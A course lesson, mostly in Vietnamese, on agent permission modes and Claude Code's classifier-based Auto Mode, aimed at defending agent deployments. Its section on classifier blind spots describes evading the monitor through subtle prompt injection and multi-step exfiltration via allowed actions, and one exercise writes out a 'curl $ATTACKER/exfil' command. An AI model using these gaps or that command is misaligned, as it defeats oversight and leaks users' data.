# Permission Modes for Autonomous Agents

> Một thang quyền — các mức tự chủ tăng dần từ xem xét mọi hành động đến phê duyệt mọi thứ — là cách một harness quản lý những gì một agent tự chủ có thể làm mà không cần hỏi. Claude Code, ví dụ được trình bày trong bài này, cung cấp sáu chế độ như vậy: “plan” hỏi trước mọi hành động, “default” (được gắn nhãn “Manual” trong giao diện) chỉ hỏi đối với những hành động rủi ro, “acceptEdits” tự động phê duyệt việc ghi file nhưng vẫn xác nhận thực thi shell, và “bypassPermissions” phê duyệt mọi thứ. Auto Mode — chế độ quyền `auto` — thay thế phê duyệt từng hành động bằng một mô hình phân loại riêng xem xét mỗi hành động trước khi chạy và chặn bất kỳ điều gì leo thang vượt quá những gì yêu cầu đề nghị. Ngân sách hành động được thực thi thông qua `max_turns` và `max_budget_usd`. Tính khả dụng của `auto` phụ thuộc vào gói, việc bật trong tổ chức, mô hình, và nhà cung cấp — và Anthropic nói rõ rằng chỉ riêng bộ phân loại là không đủ.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## The Problem

Một agent lập trình tự chủ trên máy của bạn là một loại bảo mật riêng biệt. Bề mặt tấn công là mọi thứ agent có thể tiếp cận — hệ thống file, mạng, thông tin xác thực, clipboard, bất kỳ tab trình duyệt nào, bất kỳ terminal đang mở nào. Bruce Schneier và những người khác đã công khai nêu điều này: các agent sử dụng máy tính không phải là một “bản cập nhật tính năng” của chatbot, chúng là một loại công cụ mới với một loại hồ sơ rủi ro mới.

Hệ thống quyền của Claude Code là câu trả lời của Anthropic. Thay vì một công tắc “tự chủ / không tự chủ”, có sáu chế độ trải trên một thang năng lực: plan → default → acceptEdits → … → bypassPermissions. Mỗi chế độ là một sự đánh đổi khác nhau giữa tốc độ và việc xem xét từng hành động. Auto Mode (tháng 3 năm 2026) bổ sung một mô hình phân loại riêng đưa việc phê duyệt ra khỏi đường găng của người dùng: nó xem xét mỗi hành động trước khi chạy và chặn bất cứ điều gì leo thang vượt quá yêu cầu.

Câu hỏi kỹ thuật: hệ thống này bắt được gì, bỏ sót gì, và một tác vụ nhất định thực sự cần chế độ nào?

## The Concept

### The six permission modes

| Chế độ | Hành vi | Khi nào sử dụng |
|---|---|---|
| `plan` | Agent đề xuất một kế hoạch; người dùng phê duyệt toàn bộ kế hoạch; mọi hành động được xem xét trước khi thực thi | Tác vụ chưa quen; mã gần môi trường sản xuất; lần đầu sử dụng agent trên một repo |
| `default` | Được gắn nhãn “Manual” trong giao diện. Agent chạy các hành động; nhắc người dùng đối với bất kỳ hành động “rủi ro” nào (thực thi shell, thao tác phá hủy, lệnh gọi mạng) | Hầu hết các phiên lập trình tương tác |
| `acceptEdits` | Ghi file được tự động phê duyệt; thực thi shell và các lệnh gọi mạng vẫn nhắc | Lượt tái cấu trúc trên nhiều file |
| `auto` | Một mô hình phân loại riêng xem xét mỗi hành động trước khi chạy; chặn bất kỳ điều gì leo thang vượt quá yêu cầu | Các lần chạy không có người giám sát với tầm thời gian dài trong một không gian làm việc bị giới hạn |
| `dontAsk` | Không bao giờ nhắc; các hành động không được quy tắc quyền phê duyệt trước bị từ chối | Sandbox tạm thời, tác vụ CI, script nghiên cứu |
| `bypassPermissions` | Phê duyệt mọi thứ | Được ghi trong tài liệu là “chỉ bên trong các container tạm thời mà bạn sẵn sàng vứt bỏ” |

(Các tên ở trên khớp với tài liệu Claude Code công khai; giao diện gắn nhãn `default` là “Manual”.)

### Auto Mode in one page

Auto Mode (ra mắt ngày 24 tháng 3 năm 2026) là chế độ quyền đầu tiên giao việc phê duyệt từng hành động cho một mô hình. Cấu trúc:

1. **Một mô hình phân loại riêng.** Xem xét mọi hành động được đề xuất trước khi chạy, đánh giá dựa trên tác vụ đã khai báo và trạng thái hiện tại của phiên, và chặn bất kỳ điều gì leo thang vượt quá những gì yêu cầu đề nghị. Các hành động bị chặn được chuyển về cho người dùng.
2. **Tính khả dụng có điều kiện.** Việc `auto` có được cung cấp hay không phụ thuộc vào gói, việc bật trong tổ chức, mô hình, và nhà cung cấp.

Các kiểm soát ngân sách nằm bên cạnh bộ phân loại:

- `max_turns` — tổng số lần lặp trong một phiên.
- `max_budget_usd` — mức trần bằng đô la khiến phiên bị hủy.
- giới hạn số lượng hành động cho từng công cụ (không quá N lệnh gọi `WebFetch`, v.v.).

### What the system catches

- Chèn prompt trực tiếp vào đầu vào công cụ, nơi chỉ dẫn được chèn ánh xạ tới một dạng hành động được biết là rủi ro.
- Các vòng lặp công cụ lặp đi lặp lại — bộ phân loại có thể thấy hành động N+1 gần như giống hệt hành động N, năm lần liên tiếp.
- Các lệnh shell rõ ràng ngoài phạm vi trong một phiên vốn chỉ chỉnh sửa file.

### What the system can miss

- **Chèn prompt tinh vi** điều chỉnh hành vi mà không tạo ra một hành động bị gắn cờ riêng lẻ nào. Chèn prompt gián tiếp không phải là một lỗ hổng có thể vá hoàn toàn (người đứng đầu bộ phận preparedness của OpenAI, 2025, về agent trình duyệt — xem Bài 11).
- **Hành vi sai ở cấp ngữ nghĩa.** Mỗi hành động riêng lẻ có thể trông an toàn trong khi quỹ đạo kết hợp gây hại. Bộ phân loại đánh giá hành động; nó không suy ra lại ý định của người dùng.
- **Rò rỉ dữ liệu qua các kênh hợp lệ.** Ghi dữ liệu vào một file bạn sở hữu, rồi thực hiện `git push` tới một repo công khai, là một chuỗi hành động được phép mà sự kết hợp của chúng chính là vấn đề.

### Research preview framing

Anthropic phát hành Auto Mode dưới dạng bản xem trước nghiên cứu. Tài liệu nói rõ rằng bộ phân loại là một lớp, không phải một giải pháp: người dùng được kỳ vọng kết hợp Auto Mode với ngân sách, danh sách cho phép, không gian làm việc cách ly, và kiểm toán quỹ đạo (Bài 12–16). Cách định vị bản xem trước cũng phản ánh khoảng cách giữa đánh giá và triển khai đã được ghi nhận (Bài 1) — một bộ phân loại vượt qua các đánh giá ngoại tuyến có thể hành xử khác trong một phiên thực, nơi ngữ cảnh của người dùng mơ hồ.

### Where this ladder lives in your workflow

- Tác vụ chưa quen: bắt đầu ở `plan`. Đọc kế hoạch ít tốn kém hơn hoàn tác một lần chạy tệ.
- Tái cấu trúc đã biết: `acceptEdits` tiết kiệm nhiều lần nhấp xác nhận.
- Lần chạy nền không có người giám sát: chỉ dùng `auto` bên trong một không gian làm việc có phạm vi ảnh hưởng mà bạn đã đo (không có thông tin xác thực, không có mount sản xuất, không có lưu lượng đi ra mà bạn chưa chủ động chọn).
- Container tạm thời: `dontAsk` / `bypassPermissions` có thể chấp nhận nếu và chỉ nếu container và thông tin xác thực của nó có thể vứt bỏ.

```figure
autonomy-oversight
```

## Use It

`code/main.py` mô phỏng một bộ phân loại xem xét hành động dưới dạng pipeline hai giai đoạn — một sự đơn giản hóa để giảng dạy; chế độ `auto` thực được hỗ trợ bởi một mô hình phân loại riêng, chứ không phải một hợp đồng hai giai đoạn được ghi trong tài liệu. Giai đoạn 1 là một quy tắc từ khóa rẻ trên các hành động được đề xuất; Giai đoạn 2 là một bộ xem xét nhiều quy tắc chậm hơn. Trình điều khiển đưa vào một quỹ đạo tổng hợp ngắn (các hành động an toàn, một nỗ lực chèn prompt, một vòng lặp lặp đi lặp lại) và cho thấy nơi bộ phân loại bắt được và nơi nó bỏ sót.

## Ship It

`outputs/skill-permission-mode-picker.md` ghép một mô tả tác vụ với chế độ quyền, mức trần ngân sách, và cách ly bắt buộc phù hợp.

## Exercises

1. Chạy `code/main.py`. Loại hành động tổng hợp nào không bao giờ bị Giai đoạn 1 gắn cờ nhưng luôn bị Giai đoạn 2 bắt? Loại nào cả hai đều không bắt được?

2. Mở rộng tập quy tắc Giai đoạn 1 để bắt một dạng cụ thể được biết là xấu (ví dụ: `curl $ATTACKER/exfil`). Đo tỷ lệ dương tính giả trên mẫu hành động lành tính.

3. Đọc tài liệu “How the agent loop works” của Anthropic. Liệt kê mọi trạng thái bên ngoài mà agent chạm tới theo mặc định trong chế độ `default`. Bạn cần kiểm soát riêng trạng thái nào trước khi chạy `auto` không có người giám sát?

4. Thiết kế ngân sách cho lần chạy 24 giờ không có người giám sát: `max_turns`, `max_budget_usd`, mức trần cho từng công cụ, danh sách cho phép. Giải thích từng con số.

5. Mô tả một quỹ đạo mà mọi hành động riêng lẻ đều được bộ phân loại phê duyệt, nhưng hành vi kết hợp lại lệch căn chỉnh. (Bài 14 trình bày cách các công tắc ngắt và token canary giải quyết điều này.)

## Key Terms

| Thuật ngữ | Mọi người nói gì | Ý nghĩa thực sự |
|---|---|---|
| Permission mode (Chế độ quyền) | “Agent có thể làm bao nhiêu” | Một trong sáu chính sách có tên kiểm soát việc phê duyệt từng hành động |
| plan mode (Chế độ plan) | “Hỏi trước bất cứ điều gì” | Agent viết một kế hoạch; người dùng phê duyệt trước khi thực thi |
| acceptEdits | “Để nó ghi file” | Ghi file được tự động phê duyệt; thực thi shell vẫn nhắc |
| auto | “Phê duyệt tự động” | Mô hình phân loại riêng xem xét mỗi hành động; chặn leo thang vượt quá yêu cầu |
| bypassPermissions | “YOLO hoàn toàn” | Phê duyệt mọi thứ; dành cho container tạm thời |
| Stage 1 (simulator) (Giai đoạn 1 (bộ mô phỏng)) | “Kiểm tra từ khóa nhanh” | Quy tắc rẻ trên các hành động được đề xuất trong `code/main.py` |
| Stage 2 (simulator) (Giai đoạn 2 (bộ mô phỏng)) | “Xem xét sâu” | Bộ xem xét nhiều quy tắc chậm hơn cho các hành động bị gắn cờ trong `code/main.py` |
| Research preview (Bản xem trước nghiên cứu) | “Chưa GA” | Cách định vị của Anthropic cho các tính năng có chế độ lỗi vẫn đang được lập bản đồ |

## Further Reading

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — các chế độ quyền, ngân sách, định dạng hành động.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — mô hình thực thi dịch vụ được quản lý.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — bề mặt tính năng và thông báo Auto Mode.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — lớp dựa trên lý do định hình các phán đoán của bộ phân loại.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — góc nhìn nội bộ về thiết kế quyền có tầm thời gian dài.
